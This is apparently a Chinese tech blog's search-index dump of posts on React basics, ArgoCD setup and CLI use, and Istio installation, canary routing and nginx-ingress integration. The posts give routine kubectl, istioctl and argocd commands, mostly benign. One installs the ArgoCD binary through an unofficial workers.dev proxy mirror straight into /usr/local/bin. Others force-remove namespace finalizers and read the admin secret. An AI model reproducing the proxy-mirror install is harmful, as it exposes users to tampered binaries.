console.log('Mounting(componentWillMount)-组件将要加载') } componentDidMount(){ console.log('Mounting(componentDidMount)-组件已加载') } componentWillReceiveProps(){ console.log('Updation(componentWillReceiveProps)-不知道') } // 是否允许更新数据 shouldComponentUpdate(){ console.log('Updation(shouldComponentUpdate)-要更新数据吗') return true; // 允许 } componentWillUpdate(){ console.log('Updation(componentWillUpdate)-数据将要更新') } componentDidUpdate(){ console.log('Updation(componentDidUpdate)-数据已更新') } // 这里使用的箭头函数。使用普通函数获取不到this。 updateUser = () =\u003e { this.setState({ name: 'TC', age: '19' }) } render(){ console.log('Mounting or Updation(render)-组件加载或数据更新') return \u003cdiv\u003e \u003ch1\u003e姓名: {this.state.name}\u003c/h1\u003e \u003cp\u003e年龄: {this.state.age}\u003c/p\u003e \u003cp\u003e擅长: 梦游\u003c/p\u003e \u003cbutton onClick={this.updateUser}\u003e更新数据\u003c/button\u003e \u003c/div\u003e } } ReactDOM.render( \u003cInfoPlus /\u003e, document.getElementById('app') ) ","date":"2021-10-05 23:08","objectID":"/post/2698/:0:5","tags":["react"],"title":"React入门学习-基础(一)","uri":"/post/2698/"},{"categories":["前端"],"content":"表单、TODO应用 class List extends React.Component{ constructor(props){ # 使用state之前必须先走这个 super(props) # 定义两个空值 this.state = { val: '', // 作为临时存储，每次输入内容后都会被替换 list: [] // 一个列表，存储所有添加进来的内容 } } // 将input框输入的内容暂存到state.val中 handleInput = (event) =\u003e { this.setState({ val: event.target.value }) } // 读取val的内容将其添加到state.list中 handleAdd = () =\u003e { const { val, list } = this.state list.push(val) // 要想改变数据时同步更新到页面中，必须使用setState this.setState({ list: list }) } render(){ const val = this.state.val const arr = this.state.list let itemList = [] // 存放所有li标签元素 // 通过循环出state.list中的值,生成li标签,最后push到itemList arr.map((item,index)=\u003e{ let li = \u003cli key={index}\u003e{item}\u003c/li\u003e itemList.push(li) }) return \u003cdiv\u003e \u003cdiv\u003e \u003cinput type=\"text\" value={val} onChange={this.handleInput} /\u003e \u003cbutton onClick={this.handleAdd}\u003e添加\u003c/button\u003e \u003c/div\u003e \u003cul\u003e {itemList} \u003c/ul\u003e \u003c/div\u003e } } ReactDOM.render(\u003cList /\u003e, document.getElementById('app')) ","date":"2021-10-05 23:08","objectID":"/post/2698/:0:6","tags":["react"],"title":"React入门学习-基础(一)","uri":"/post/2698/"},{"categories":["kubernetes","devops"],"content":"https://argo-cd.readthedocs.io/en/stable/operator-manual/webhook/ ","date":"2021-09-29 11:34","objectID":"/post/2694/:0:0","tags":["k8s","devops","cd","argocd"],"title":"argocd-推模式配置","uri":"/post/2694/"},{"categories":["kubernetes","devops"],"content":"参考: https://argoproj.github.io/argo-cd/operator-manual/health/#custom-health-checks k edit cm -n argocd argocd-cm data: resource.customizations.health.extensions_Ingress: | hs = {} hs.status = \"Healthy\" hs.message = \"SoulChild\" return hs resource.customizations.useOpenLibs.extensions_Ingress: \"true\" 删除pod(没试过不删行不行)，然后argocd重新sync。 k delete pod -n argocd argocd-application-controller-0 ","date":"2021-09-28 14:43","objectID":"/post/2687/:0:0","tags":["k8s","devops","argocd"],"title":"解决argocd ingress资源状态一直Progressing","uri":"/post/2687/"},{"categories":["kubernetes","devops"],"content":"一、安装 ","date":"2021-09-27 17:15","objectID":"/post/2682/:1:0","tags":["k8s","devops","gitops","cd"],"title":"argocd安装及入门使用","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"1.安装argocd kubectl create namespace argocd kubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml 如果使用其他命名空间,需要手动修改ClusterRoleBinding引用的ServiceAccount所在的namespace ","date":"2021-09-27 17:15","objectID":"/post/2682/:1:1","tags":["k8s","devops","gitops","cd"],"title":"argocd安装及入门使用","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"2.暴露argocd ui # NodePort方式 kubectl patch service -n argocd argocd-server -p '{\"spec\": {\"type\": \"NodePort\"}}' ","date":"2021-09-27 17:15","objectID":"/post/2682/:1:2","tags":["k8s","devops","gitops","cd"],"title":"argocd安装及入门使用","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"3.登陆argocd # 获取admin登陆密码 kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath=\"{.data.password}\" | base64 -d ","date":"2021-09-27 17:15","objectID":"/post/2682/:1:3","tags":["k8s","devops","gitops","cd"],"title":"argocd安装及入门使用","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"4.安装cli # linux wget -O /usr/local/bin/argocd https://github.91chifun.workers.dev/https://github.com//argoproj/argo-cd/releases/download/v2.1.2/argocd-linux-amd64 \u0026\u0026 chmod +x /usr/local/bin/argocd # mac sudo wget -O /usr/local/bin/argocd https://github.91chifun.workers.dev/https://github.com//argoproj/argo-cd/releases/download/v2.1.2/argocd-darwin-amd64 \u0026\u0026 sudo chmod +x /usr/local/bin/argocd ","date":"2021-09-27 17:15","objectID":"/post/2682/:1:4","tags":["k8s","devops","gitops","cd"],"title":"argocd安装及入门使用","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"二、简单使用 ","date":"2021-09-27 17:15","objectID":"/post/2682/:2:0","tags":["k8s","devops","gitops","cd"],"title":"argocd安装及入门使用","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"1.准备git仓库 目录结构 $ tree . . ├── README.md └── web-server-headers ├── deploy.yaml ├── ingress.yaml └── svc.yaml deploy.yaml是部署文件 ","date":"2021-09-27 17:15","objectID":"/post/2682/:2:1","tags":["k8s","devops","gitops","cd"],"title":"argocd安装及入门使用","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"2.配置argocd仓库 53645-7p12nzzzj1q.png 44264-8p8dcz4gba.png ","date":"2021-09-27 17:15","objectID":"/post/2682/:2:2","tags":["k8s","devops","gitops","cd"],"title":"argocd安装及入门使用","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"3.创建应用 08298-w403pblpvnd.png ","date":"2021-09-27 17:15","objectID":"/post/2682/:2:3","tags":["k8s","devops","gitops","cd"],"title":"argocd安装及入门使用","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"4.查看结果 74565-97zgp2ps7j.png ","date":"2021-09-27 17:15","objectID":"/post/2682/:2:4","tags":["k8s","devops","gitops","cd"],"title":"argocd安装及入门使用","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"三、cli使用 ","date":"2021-09-27 17:15","objectID":"/post/2682/:3:0","tags":["k8s","devops","gitops","cd"],"title":"argocd安装及入门使用","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"3.1 快速入门操作 1.登陆 argocd login ArgoCD_Address:Port 37459-3hgps5l2tl4.png 2.修改密码 argocd account update-password 3.从git仓库创建一个Application argocd app create guestbook --repo https://github.com/argoproj/argocd-example-apps.git --path guestbook --dest-server https://kubernetes.default.svc --dest-namespace default 创建一个guestbook app,指定仓库地址、应用路径、目标apiserver地址、目标namespace 4.列出所有app和指定app argocd app list argocd app get guestbook 5.手动从git仓库同步指定app argocd app sync guestbook 72158-qlb856vuy8.png ","date":"2021-09-27 17:15","objectID":"/post/2682/:3:1","tags":["k8s","devops","gitops","cd"],"title":"argocd安装及入门使用","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"3.2 管理项目 创建项目 argocd proj create myproject -d https://kubernetes.default.svc,mynamespace -s https://github.com/argoproj/argocd-example-apps.git -d: 该项目允许使用的apiserver和namespace -s: 允许使用的git仓库 查看项目列表: argocd proj list 添加项目可使用的git仓库: argocd proj add-source \u003cPROJECT\u003e \u003cREPO\u003e 删除项目可使用的git仓库: argocd proj remove-source \u003cPROJECT\u003e \u003cREPO\u003e 限制项目可使用的k8s资源(cluster级别资源默认拒绝,namespace级别默认允许): # 允许使用什么样的资源 argocd proj allow-cluster-resource \u003cPROJECT\u003e \u003cGROUP\u003e \u003cKIND\u003e argocd proj allow-namespace-resource \u003cPROJECT\u003e \u003cGROUP\u003e \u003cKIND\u003e # 拒绝使用什么样的资源 argocd proj deny-cluster-resource \u003cPROJECT\u003e \u003cGROUP\u003e \u003cKIND\u003e argocd proj deny-namespace-resource \u003cPROJECT\u003e \u003cGROUP\u003e \u003cKIND\u003e Application分配给项目: argocd app set guestbook-default --project myproject 获取项目信息: argocd proj get myproject 编辑项目yaml: argocd proj edit myproject ","date":"2021-09-27 17:15","objectID":"/post/2682/:3:2","tags":["k8s","devops","gitops","cd"],"title":"argocd安装及入门使用","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"3.3 管理APP 查看APP列表: argocd app list|get|delete|create -p: 根据项目过滤 -l: 根据标签过滤 -r: 根据仓库过滤 -o: 输出格式。wide|name|json|yaml 手动同步: argocd app sync \u003cAPPNAME\u003e ","date":"2021-09-27 17:15","objectID":"/post/2682/:3:3","tags":["k8s","devops","gitops","cd"],"title":"argocd安装及入门使用","uri":"/post/2682/"},{"categories":["kubernetes","devops"],"content":"3.4 自动同步相关 开启自动同步: argocd app set \u003cAPPNAME\u003e --sync-policy auto 关闭自动同步: argocd app set \u003cAPPNAME\u003e --sync-policy none 自动同步时,自动删除git中不存在的资源: argocd app set \u003cAPPNAME\u003e --auto-prune=true 是否允许一个application有0个资源: argocd app set \u003cAPPNAME\u003e --allow-empty=true 时刻保证与git中定义的状态同步: argocd app set \u003cAPPNAME\u003e --self-heal=true 自动同步会将所有对象都同步,对apiserver可能会造成更大的压力,可以只同步out-of-sync状态的资源: argocd app set \u003cAPPNAME\u003e --sync-option ApplyOutOfSyncOnly=true ** 执行自动同步的要求 ** 仅当Application为 OutOfSync 时才会执行自动同步。 同一个commit id只会同步一次，不管成功还是失败 argocd每三分钟会检测git仓库一次,用于判断app与git中描述的状态是否一致，如果不一致状态为OutOfSync。(注意这里并不会触发更新，除非配置了自动同步) ","date":"2021-09-27 17:15","objectID":"/post/2682/:3:4","tags":["k8s","devops","gitops","cd"],"title":"argocd安装及入门使用","uri":"/post/2682/"},{"categories":["kubernetes","Istio"],"content":"部署jaeger 1.安装 k apply -f https://raw.githubusercontent.com/istio/istio/release-1.9/samples/addons/jaeger.yaml ","date":"2021-09-26 14:42","objectID":"/post/2678/:0:1","tags":["k8s","istio","kiali","jaeger"],"title":"Istio-集成遥测插件kiali、jaeger、prometheus","uri":"/post/2678/"},{"categories":["kubernetes","Istio"],"content":"部署kiali 1.安装 k apply -f https://raw.githubusercontent.com/istio/istio/release-1.9/samples/addons/kiali.yaml 由于部署顺序问题，可能会导致创建失败，再运行一次上面命令即可。 2.检查部署状态 k rollout status deployment/kiali -n istio-system 3.接入prometheus、grafana、jaeger 修改configmap k edit -n istio-system cm kiali 内容如下: external_services: custom_dashboards: enabled: true prometheus: url: http://prometheus-k8s.monitoring:9090 grafana: enabled: true in_cluster_url: \"http://grafana.monitoring:3000\" url: \"http://192.168.2.10:30462\" tracing: enabled: true in_cluster_url: \"http://tracing.istio-system/jaeger\" url: \"http://192.168.2.10:32344/jaeger\" 4.重启pod k rollout -n istio-system restart deployment kiali ","date":"2021-09-26 14:42","objectID":"/post/2678/:0:2","tags":["k8s","istio","kiali","jaeger"],"title":"Istio-集成遥测插件kiali、jaeger、prometheus","uri":"/post/2678/"},{"categories":["kubernetes","Istio"],"content":"grafana-istio仪表盘 Istio Control Plane Dashboard: 7645 Istio Mesh Dashboard: 7639 Istio Performance Dashboard: 12153 Istio Service Dashboard: 7636 Istio Wasa Extension Dashboard: 13277 Istio Workload Dashboard: 7630 ","date":"2021-09-26 14:42","objectID":"/post/2678/:0:3","tags":["k8s","istio","kiali","jaeger"],"title":"Istio-集成遥测插件kiali、jaeger、prometheus","uri":"/post/2678/"},{"categories":["前端"],"content":"antd小帮手 ","date":"2021-09-26 01:17","objectID":"/post/2675/:1:0","tags":["antd pro","react"],"title":"Antd Pro速查","uri":"/post/2675/"},{"categories":["前端"],"content":"查找icon icon地址: https://ant.design/components/icon-cn/ 菜单icon使用方法: 点击图标复制组件名称, 粘贴到route.ts的icon中。尖括号需要去除,只保留名称。 https://pro.ant.design/zh-CN/docs/new-page#%E5%9C%A8%E8%8F%9C%E5%8D%95%E4%B8%AD%E4%BD%BF%E7%94%A8-iconfont ","date":"2021-09-26 01:17","objectID":"/post/2675/:1:1","tags":["antd pro","react"],"title":"Antd Pro速查","uri":"/post/2675/"},{"categories":["前端"],"content":"主配色 config/defaultSettings.ts文件的primaryColor参数 绿色: #52c41a，#1DA57A ","date":"2021-09-26 01:17","objectID":"/post/2675/:1:2","tags":["antd pro","react"],"title":"Antd Pro速查","uri":"/post/2675/"},{"categories":["前端"],"content":"快速生成代码块模板 输入rsc然后table,快速生成代码块模板 ","date":"2021-09-26 01:17","objectID":"/post/2675/:1:3","tags":["antd pro","react"],"title":"Antd Pro速查","uri":"/post/2675/"},{"categories":["前端"],"content":"pro布局组件(表格卡片之类的) https://procomponents.ant.design/components ","date":"2021-09-26 01:17","objectID":"/post/2675/:1:4","tags":["antd pro","react"],"title":"Antd Pro速查","uri":"/post/2675/"},{"categories":["前端"],"content":"图表组件库(监控必备) https://charts.ant.design/zh-CN/demos/global/ 这是一个折线图取区域标记的例子(可用于当某些监控指标过高时，使用红色标记出来) annotations: [ { type: 'regionFilter', start: ['start', 'median'], // start指定起点坐标(前者是代表x轴，后者代表y轴) end: ['max', 'max'], // end指定终点坐标。最后将起点和重点之间的区域标记起来 color: '#F4664A', style: { textBaseline: 'bottom'}, }, ","date":"2021-09-26 01:17","objectID":"/post/2675/:1:5","tags":["antd pro","react"],"title":"Antd Pro速查","uri":"/post/2675/"},{"categories":["前端"],"content":"修改底部信息 src/components/Footer/index.tsx defaultMessage links ","date":"2021-09-26 01:17","objectID":"/post/2675/:1:6","tags":["antd pro","react"],"title":"Antd Pro速查","uri":"/post/2675/"},{"categories":["前端"],"content":"函数写法解释 const DemoLine: React.FC = () =\u003e {} 定义一个对象为DemoLine，类型为React.FC(React.functionComponent)。类型可写可不写 ","date":"2021-09-26 01:17","objectID":"/post/2675/:1:7","tags":["antd pro","react"],"title":"Antd Pro速查","uri":"/post/2675/"},{"categories":["kubernetes"],"content":" ns=ingress-nginx kubectl get namespace ${ns} -o json | jq '.spec.finalizers=[]' | kubectl replace --raw /api/v1/namespaces/${ns}/finalize -f - ","date":"2021-09-22 11:23","objectID":"/post/2661/:0:0","tags":["k8s"],"title":"k8s强制删除namespace","uri":"/post/2661/"},{"categories":["kubernetes","Istio"],"content":"参考链接: https://www.tetrate.io/blog/using-istio-with-other-ingress-proxies/ annotation解释: https://istio.io/v1.9/zh/docs/reference/config/annotations/ ","date":"2021-09-22 11:07","objectID":"/post/2660/:0:0","tags":["k8s","istio"],"title":"Istio使用nginx-controller作为网关","uri":"/post/2660/"},{"categories":["kubernetes","Istio"],"content":"Ready 操作前备份 k get deployments -n ingress-nginx ingress-nginx-controller -o yaml \u003e ingress-nginx-controller.yaml ","date":"2021-09-22 11:07","objectID":"/post/2660/:0:1","tags":["k8s","istio"],"title":"Istio使用nginx-controller作为网关","uri":"/post/2660/"},{"categories":["kubernetes","Istio"],"content":"一、修改nginx-controller pod注解 这一步的目的主要是将入口流量完全交给nginx,出口流量交给envoy(排除10.1.0.1,nginx与apiserver通信的地址) k edit deployment -n ingress-nginx ingress-nginx-controller traffic.sidecar.istio.io/includeInboundPorts: \"\" # 将指定端口的流量重定向到envoy sidecar traffic.sidecar.istio.io/excludeInboundPorts: \"80,443\" # 将指定端口的流量不重定向到envoy sidecar traffic.sidecar.istio.io/excludeOutboundIPRanges: \"10.1.0.1/32\" # 将指定ip范围的流出流量不重定向到envoy sidecar。`k get svc kubernetes -o jsonpath='{.spec.clusterIP}'` 96565-rkn931fu8s.png ","date":"2021-09-22 11:07","objectID":"/post/2660/:0:2","tags":["k8s","istio"],"title":"Istio使用nginx-controller作为网关","uri":"/post/2660/"},{"categories":["kubernetes","Istio"],"content":"二、将envoy注入nginx-controller k get deployments -n ingress-nginx ingress-nginx-controller -o yaml| istioctl kube-inject -f - | k apply -f - 可以将修改后的保存为yaml k get deployments -n ingress-nginx ingress-nginx-controller -o yaml \u003e ingress-nginx-controller-istio.yaml 这里我踩了个坑，一定要先有注解再进行注入。如果先注入在写注解，initContainer会先生成，这时没有注解，所以不会生效注解的配置。 ","date":"2021-09-22 11:07","objectID":"/post/2660/:0:3","tags":["k8s","istio"],"title":"Istio使用nginx-controller作为网关","uri":"/post/2660/"},{"categories":["kubernetes","Istio"],"content":"三、VirtualService配置 使用nginx-controller作为网关后，Gateway资源应该就没有作用了。因为nginx-controller是ingress-controller的实现，pilot在watch到gateway资源后不会下发配置到nginx-controller。 所以之后在virtualService中要么不写gateways，写了的话就得加上一个mesh，才能生效vs的规则 spec: gateways: - xxx - mesh hosts: - nginx-svc.istio-demo.svc.cluster.local - nginx-istio.ops.cn ","date":"2021-09-22 11:07","objectID":"/post/2660/:0:4","tags":["k8s","istio"],"title":"Istio使用nginx-controller作为网关","uri":"/post/2660/"},{"categories":["kubernetes","Istio"],"content":"四、配置Ingress测试 nginx.ingress.kubernetes.io/service-upstream: \"true\" # 默认nginx是将流量直接打到pod ip中的,而不是通过service ip。这个配置用来禁用它，使他的流量发往service ip nginx.ingress.kubernetes.io/upstream-vhost: \"xxx.default.svc.cluster.local\" # 这里写的是后端Service的完整fqdn。目的是修改Host请求头的值 经过上面的配置,请求的流量就能和vs对象中配置的hosts匹配上了。 下面是测试例子: apiVersion: extensions/v1beta1 kind: Ingress metadata: name: nginx-istio.ops.cn namespace: istio-demo annotations: kubernetes.io/ingress.class: \"nginx\" nginx.ingress.kubernetes.io/service-upstream: \"true\" nginx.ingress.kubernetes.io/upstream-vhost: \"nginx-svc.istio-demo.svc.cluster.local\" spec: rules: - host: nginx-istio.ops.cn http: paths: - path: / backend: serviceName: nginx-svc servicePort: http pathType: Prefix ","date":"2021-09-22 11:07","objectID":"/post/2660/:0:5","tags":["k8s","istio"],"title":"Istio使用nginx-controller作为网关","uri":"/post/2660/"},{"categories":["kubernetes","Istio"],"content":"五、测试流量 通过访问nginx-controller查看virtualservice规则是否生效 99556-eecbsqu7vec.png ","date":"2021-09-22 11:07","objectID":"/post/2660/:0:6","tags":["k8s","istio"],"title":"Istio使用nginx-controller作为网关","uri":"/post/2660/"},{"categories":["kubernetes","Istio"],"content":"前言 Istio版本1.9.8 ","date":"2021-09-18 15:29","objectID":"/post/2657/:0:1","tags":["istio"],"title":"Istio1.9 安装-operator方式","uri":"/post/2657/"},{"categories":["kubernetes","Istio"],"content":"一、安装istioctl wget https://github.com/istio/istio/releases/download/1.9.8/istio-1.9.8-linux-amd64.tar.gz tar xf istio-1.9.8-linux-amd64.tar.gz cp istio-1.9.8/bin/istioctl /usr/local/bin/ ","date":"2021-09-18 15:29","objectID":"/post/2657/:0:2","tags":["istio"],"title":"Istio1.9 安装-operator方式","uri":"/post/2657/"},{"categories":["kubernetes","Istio"],"content":"二、安装istio operator istioctl operator init 此命令运行 operator 在 istio-operator 命名空间中创建以下资源： operator CRD crd的控制器 deployment/istio-operator 一个service，用于暴露istio operator的metrics Istio operator运行所必须的RBAC规则 ","date":"2021-09-18 15:29","objectID":"/post/2657/:0:3","tags":["istio"],"title":"Istio1.9 安装-operator方式","uri":"/post/2657/"},{"categories":["kubernetes","Istio"],"content":"三、安装istio kubectl create ns istio-system kubectl apply -f - \u003c\u003cEOF apiVersion: install.istio.io/v1alpha1 kind: IstioOperator metadata: namespace: istio-system name: istio-controlplane spec: profile: default EOF profile预定义配置: https://istio.io/v1.9/zh/docs/setup/additional-setup/config-profiles/ profile自定义配置: https://istio.io/v1.9/zh/docs/reference/config/istio.operator.v1alpha1/ 不同配置的区别 获取清单配置 istioctl manifest generate \u003e default.yaml istioctl manifest generate --set profile=demo \u003e demo.yaml 只获取IstioOperator配置 istioctl profile dump default \u003e default.yaml istioctl profile dump demo \u003e demo.yaml 总体来看主要是demo配置中多了egressgateway configMap–\u003eistio demo配置中多出如下内容:accessLogFile: /dev/stdout # 将日志输出到控制台,默认配置是禁用的。` deployment–\u003eistio-egressgateway demo配置中多了istio-egressgateway组件 hpa–\u003eistiod、ingressgateway default配置有两个hpa相关的配置.可以到istio-system命名空间下找到istio-ingressgateway、istiod ","date":"2021-09-18 15:29","objectID":"/post/2657/:0:4","tags":["istio"],"title":"Istio1.9 安装-operator方式","uri":"/post/2657/"},{"categories":["kubernetes","Istio"],"content":"四、查看安装结果 k get pod -n istio-system k get istiooperators -n istio-system istio-controlplane ","date":"2021-09-18 15:29","objectID":"/post/2657/:0:5","tags":["istio"],"title":"Istio1.9 安装-operator方式","uri":"/post/2657/"},{"categories":["kubernetes","Istio"],"content":"五、配置自动注入 k label namespace default istio-injection=enabled ","date":"2021-09-18 15:29","objectID":"/post/2657/:0:6","tags":["istio"],"title":"Istio1.9 安装-operator方式","uri":"/post/2657/"},{"categories":["Istio"],"content":" # 删除官方示例的插件 kubectl delete -f samples/addons # 删除istio组件 istioctl manifest generate --set profile=demo | kubectl delete --ignore-not-found=true -f - # 删除namespace kubectl delete namespace istio-system # 删除相关label kubectl label namespace xxx istio-injection- # 删除istio-crd kubectl delete namespace istio-operator ","date":"2021-09-18 15:20","objectID":"/post/2656/:0:0","tags":["istio"],"title":"Istio卸载","uri":"/post/2656/"},{"categories":["kubernetes","Istio"],"content":"一、配置namespace # 创建ns k create ns istio-demo # 开启自动注入 k label ns istio-demo istio-injection=enabled ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:1","tags":["istio"],"title":"Istio实现简单的灰度发布流程","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"二、部署nginx-v1应用 apiVersion: apps/v1 kind: Deployment metadata: name: nginx-v1 namespace: istio-demo spec: replicas: 1 selector: matchLabels: app: nginx version: v1 template: metadata: labels: app: nginx version: v1 spec: initContainers: - name: busybox image: busybox volumeMounts: - name: www mountPath: /tmp command: [\"sh\", \"-c\", \"echo 'v1' \u003e /tmp/index.html\"] containers: - name: nginx image: nginx:1.14-alpine imagePullPolicy: IfNotPresent ports: - name: http containerPort: 80 volumeMounts: - name: www mountPath: /usr/share/nginx/html/ volumes: - name: www emptyDir: {} 注意这里的标签使用了app=nginx，version=v1 ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:2","tags":["istio"],"title":"Istio实现简单的灰度发布流程","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"三、创建Service apiVersion: v1 kind: Service metadata: name: nginx-svc namespace: istio-demo spec: type: ClusterIP ports: - name: http port: 80 targetPort: 80 selector: app: nginx 这里选择所有app=nginx的pod ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:3","tags":["istio"],"title":"Istio实现简单的灰度发布流程","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"四、创建Gateway 允许访问nginx-istio.ops.cn的外部流量 apiVersion: networking.istio.io/v1alpha3 kind: Gateway metadata: name: nginx-gw namespace: istio-demo spec: selector: # 这里使用的是istio的默认网关,后面会介绍使用nginx-controller作为网关 istio: ingressgateway servers: - port: number: 80 name: http protocol: HTTP hosts: - \"nginx-istio.ops.cn\" ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:4","tags":["istio"],"title":"Istio实现简单的灰度发布流程","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"五、创建VirtualService 将nginx服务的流量都走向v1版本 apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: nginx-vs namespace: istio-demo spec: exportTo: - \"*\" gateways: - nginx-gw hosts: - 'nginx-svc.istio-demo.svc.cluster.local' - 'nginx-istio.ops.cn' http: - route: - destination: host: nginx-svc subset: v1 weight: 100 - destination: host: nginx-svc subset: v2 ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:5","tags":["istio"],"title":"Istio实现简单的灰度发布流程","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"六、配置DestinationRule 为nginx-svc定义两个子集 apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: nginx-dr namespace: istio-demo spec: host: nginx-svc subsets: - name: v1 labels: version: v1 - name: v2 labels: version: v2 ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:6","tags":["istio"],"title":"Istio实现简单的灰度发布流程","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"七、访问测试 获取nodeport端口 k get svc -n istio-system istio-ingressgateway -o jsonpath='{.spec.ports[?(@.name==\"http2\")].nodePort}' http://nginx-istio.ops.cn:32629/ ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:7","tags":["istio"],"title":"Istio实现简单的灰度发布流程","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"八、部署nginx-v2灰度版本 apiVersion: apps/v1 kind: Deployment metadata: name: nginx-v2 namespace: istio-demo spec: replicas: 1 selector: matchLabels: app: nginx version: v2 template: metadata: labels: app: nginx version: v2 spec: initContainers: - name: busybox image: busybox volumeMounts: - name: www mountPath: /tmp command: [\"sh\", \"-c\", \"echo 'v2' \u003e /tmp/index.html\"] containers: - name: nginx image: nginx:1.14-alpine imagePullPolicy: IfNotPresent ports: - name: http containerPort: 80 volumeMounts: - name: www mountPath: /usr/share/nginx/html/ volumes: - name: www emptyDir: {} 目前为止流量还都在v1上 ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:8","tags":["istio"],"title":"Istio实现简单的灰度发布流程","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"九、切10%的流量到v2版本 apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: nginx-vs namespace: istio-demo spec: exportTo: - \"*\" gateways: - nginx-gw hosts: - 'nginx-svc.istio-demo.svc.cluster.local' - 'nginx-istio.ops.cn' http: - route: - destination: host: nginx-svc subset: v1 weight: 90 - destination: host: nginx-svc subset: v2 weight: 10 ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:9","tags":["istio"],"title":"Istio实现简单的灰度发布流程","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"十、访问测试 访问100次进行测试 for i in {1..100};do curl -s http://nginx-istio.ops.cn:32629 ;done | sort | uniq -c 20480-xcs0fp8hwua.png ","date":"2021-09-17 19:10","objectID":"/post/2654/:0:10","tags":["istio"],"title":"Istio实现简单的灰度发布流程","uri":"/post/2654/"},{"categories":["kubernetes","Istio"],"content":"Istio学习笔记 ","date":"2021-09-12 01:04","objectID":"/post/2648/:0:0","tags":["k8s","istio"],"title":"Istio学习笔记","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"架构概述 ","date":"2021-09-12 01:04","objectID":"/post/2648/:1:0","tags":["k8s","istio"],"title":"Istio学习笔记","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"数据平面 Envoy 被部署为sidecar。发送到业务容器的请求都将会转发到envoy的端口中(通过iptables nat规则)。 envoy支持动态配置，例如监听端口、路由规则、服务发现 ","date":"2021-09-12 01:04","objectID":"/post/2648/:1:1","tags":["k8s","istio"],"title":"Istio学习笔记","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"控制平面 1.5之前的版本istio采用微服务架构，1.5之后istio回归单体应用,控制平面的组件都在istiod中 Pilot 管理和配置envoy sidecar 为Envoy sidecar提供服务发现、智能路由、流量管理的功能配置（例如，A/B 测试、金丝雀发布等）以及弹性功能配置（超时、重试、熔断器等）。 Citadel 实现服务到服务之间的身份认证(比如双向数字证书) Galley 提供istio中的配置管理服务,验证Istio的CRD资源的合法性. ","date":"2021-09-12 01:04","objectID":"/post/2648/:1:2","tags":["k8s","istio"],"title":"Istio学习笔记","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"流量管理 istio会自动检测k8s service 和 endpoint,enovy代理默认通过轮询的方式分发流量。也可以对流量进行更细粒度的控制。如A/B测试、按照流量百分比、为特定的服务实例子集应用不同的负载均衡策略、对流量进出的控制，这些都可以由Istio Api来配置。 ","date":"2021-09-12 01:04","objectID":"/post/2648/:2:0","tags":["k8s","istio"],"title":"Istio学习笔记","uri":"/post/2648/"},{"categories":["kubernetes","Istio"],"content":"流量管理相关API VirtualService: vs定义命中什么规则访问什么服务(k8s service)。 比如匹配uri前缀/aaa访问A服务，匹配/bbb访问B服务。这里定义的内容将会被istiod(pilot组件)通过apiserver监听到，最后转换为envoy配置，下发给envoy sidecar 由一组路由规则组成，用于匹配后端服务。如果有流量命中了某条路由规则，就会将其发送到对应的服务或者服务的一个版本中。 官方API文档: https://istio.io/v1.9/zh/docs/reference/config/networking/virtual-service/ 示例: apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: reviews spec: exportTo: # 表示当前vs的配置对哪些命名空间生效,默认是所有。在1.9版本中只能写`.` or `*`. 表示当前和所有命名空间 - \"*\" hosts: # 一个列表，指定服务端的访问地址。可以是IP、域名(包括service)。`*`代表匹配所有。(暂时理解为nginx的server_name--\u003e升级理解:当前规则作用在哪个访问地址上) - reviews http: # 定义路由规则的方式，可以是http、tcp、tls - match: # 定义匹配规则 - headers: # 匹配header。其他选项请移步https://istio.io/v1.9/zh/docs/reference/config/networking/virtual-service/#HTTPMatchRequest end-user: # header的key exact: jason # 使用精确匹配,匹配的value是jason。也可以写prefix、regex匹配 route: # 这里指定路由,上面的规则匹配成功后访问的实际backend - destination: host: reviews # 这里指定的是service名称 简写和完整的都可以 subset: v2 # 这里表示使用service的v2子集。service的子集需要在DestinationRule中配置。使用subset时,必须要有DestinationRule,否则会503 - route: # 这里是第二条规则,规则是空的,所以当第一条规则不匹配时，流量会直接进入reviews v3子集 - destination: host: reviews subset: v3 上面示例的整体含义: 将规则作用到reviews这个service上，匹配header中end-user是jason的请求，将它路由到reviews服务的v2子集中。其他请求进入reviews 